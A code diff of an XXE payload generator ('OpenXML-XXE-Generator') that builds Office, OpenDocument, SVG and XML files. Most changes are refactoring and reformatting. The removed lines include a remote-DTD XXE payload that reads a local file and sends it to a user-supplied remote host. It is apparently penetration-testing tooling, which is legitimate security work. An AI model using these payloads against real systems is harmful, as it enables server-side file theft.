@@ -1,70 +1,11 @@
 import zipfile
 import argparse
-import time
 import os
 import glob
-import sys
 import tempfile
 
-
-payloads = {
-    "rdtd": {
-        "description": "A Remote DTD causes the XML parser to make an external connection when successful.",
-        "payload": '<!DOCTYPE root [ <!ENTITY % start "<![CDATA["><!ENTITY % stuff SYSTEM "file://__EXFILE__"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "__PROTOCOL__://__REMOTE_HOST__">%dtd;]>',
-        "entity": "&xxe;",
-    }
-}
-
-filetypes = {
-    "docx": {
-        "ooxml": True,
-        "template": os.path.join("samples", "docx", "template.docx"),
-    },
-    "xlsx": {
-        "ooxml": True,
-        "template": os.path.join("samples", "xlsx", "template.xlsx"),
-    },
-    "odg": {
-        "ooxml": True,
-        "template": os.path.join("samples", "template.odg"),
-    },
-    "odp": {
-        "ooxml":True,
-        "template": os.path.join("samples", "template.odp"),
-    },
-    "ods": {
-        "template": os.path.join("samples", "template.ods"),
-        "ooxml":True,
-    },
-    "odt": {
-        "template": os.path.join("samples", "template.odt"),
-        "ooxml":True,
-    },
-    "pptx": {
-        "template": os.path.join("samples", "template.pptx"),
-        "ooxml":True,
-    },
-    "svg": {
-        "template": os.path.join("samples", "template.svg"),
-        "ooxml":False,
-    },
-    "xml": {
-        "template": os.path.join("samples", "template.ods"),
-        "ooxml":False,
-    },
-}
-
-# filetypes = {
-#     "docx": "samples/docx/template.docx",
-#     "xlsx": "samples/xlsx/template.xlsx",
-#     "odg": "samples/template.odg",
-#     "odp": "samples/template.odp",
-#     "ods": "samples/template.ods",
-#     "odt": "samples/template.odt",
-#     "pptx": "samples/template.pptx",
-#     "svg": "samples/template.svg",
-#     "xml": "samples/template.xml",
-# }
+from pl import payloads
+from ft import filetypes
 
 class XXeFile:
     def __init__(
@@ -99,19 +40,28 @@ class XXeFile:
         self.entity = payloads[payload]["entity"]
 
     def generate_payload(self):
-        tplpath = os.path.join(os.path.dirname(os.path.realpath(__file__)), self.template['template'])
+        tplpath = os.path.join(
+            os.path.dirname(os.path.realpath(__file__)),
+            self.template["template"],
+        )
         finalpath = self.outfile
         print(finalpath)
         if tplpath is not None:
-            if self.template['ooxml']:
-                with zipfile.ZipFile(tplpath, 'r') as zip_ref:
-                    tempdir = tempfile.mkdtemp(suffix='payload', prefix=self.filetype + '_')
+            if self.template["ooxml"]:
+                with zipfile.ZipFile(tplpath, "r") as zip_ref:
+                    tempdir = tempfile.mkdtemp(
+                        suffix="payload", prefix=self.filetype + "_"
+                    )
                     zip_ref.extractall(tempdir)
-                    with zipfile.ZipFile(finalpath, 'w', zipfile.ZIP_DEFLATED) as final:
-                        for fname in glob.glob(tempdir + '/**/*.*', recursive=True):
-                            final.write(fname, fname[len(tempdir)+1:])
+                    with zipfile.ZipFile(
+                        finalpath, "w", zipfile.ZIP_DEFLATED
+                    ) as final:
+                        for fname in glob.glob(
+                            tempdir + "/**/*.*", recursive=True
+                        ):
+                            final.write(fname, fname[len(tempdir) + 1 :])
             else:
-                replace_payload_vars(tplpath)
+                self.replace_payload_vars(tplpath)
         return finalpath
 
     def replace_payload_vars(self, tplpath):
@@ -119,7 +69,9 @@ class XXeFile:
         with open(tplpath, "r+", encoding="utf8") as tmpl:
             # Clean payload
             if "__REMOTE_HOST__" in self.payload:
-                self.payload = self.payload.replace("__REMOTE_HOST__", self.host)
+                self.payload = self.payload.replace(
+                    "__REMOTE_HOST__", self.host
+                )
             if "__PROTOCOL__" in self.payload:
                 self.payload = self.payload.replace(
                     "__PROTOCOL__", self.protocol
@@ -131,11 +83,13 @@ class XXeFile:
             tmpl.seek(0)
             tempdat = tmpl.read()
             if "__REMOTE_HOST__" in tempdat:
-                tempdat = tempdat.replace("__REMOTE_HOST__", self.protocol + '://' + self.host)
+                tempdat = tempdat.replace(
+                    "__REMOTE_HOST__", self.protocol + "://" + self.host
+                )
 
             if "__ENTITY__" in tempdat:
                 tempdat = tempdat.replace("__ENTITY__", self.entity)
-            
+
             if "__PAYLOAD__" in tempdat:
                 tempdat = tempdat.replace("__PAYLOAD__", self.payload)
 
@@ -148,7 +102,7 @@ class XXeFile:
     def to_file(self):
         tempdat = self.generate_payload()
         # with open(self.outfile, "wb") as out:
-            # out.write(bytes(tempdat, "utf8"))
+        # out.write(bytes(tempdat, "utf8"))
 
     @property
     def to_text(self):
@@ -161,10 +115,10 @@ def main():
         description="OpenXML-XXE-Generator by Richard Clifford & Jordy Zomer"
     )
     parser.add_argument(
-        "--host", 
-        type=str, 
+        "--host",
+        type=str,
         required=True,
-        help="The host to use in your payloads"
+        help="The host to use in your payloads",
     )
     parser.add_argument(
         "--protocol",
@@ -174,24 +128,28 @@ def main():
         default="http://",
     )
     parser.add_argument(
-        "--filetype", 
-        type=str, 
+        "--filetype",
+        type=str,
         required=False,
         default="docx",
-        help="The type to use in your payloads. Supported formats: {0}".format(", ".join(list(filetypes.keys())))
+        help="The type to use in your payloads. Supported formats: {0}".format(
+            ", ".join(list(filetypes.keys()))
+        ),
     )
     parser.add_argument(
-        "--payload", 
-        type=str, 
+        "--payload",
+        type=str,
         required=False,
         default="rdtd",
-        help="The payload to use in your payloads. Supported payloads: {0}".format(", ".join(list(payloads.keys())))
+        help="The payload to use in your payloads. Supported payloads: {0}".format(
+            ", ".join(list(payloads.keys()))
+        ),
     )
     parser.add_argument(
-        "--outfile", 
+        "--outfile",
         required=True,
-        type=str, 
-        help="The resulting payload file. Generated into ./output/"
+        type=str,
+        help="The resulting payload file. Generated into ./output/",
     )
     parser.add_argument(
         "--exfile",
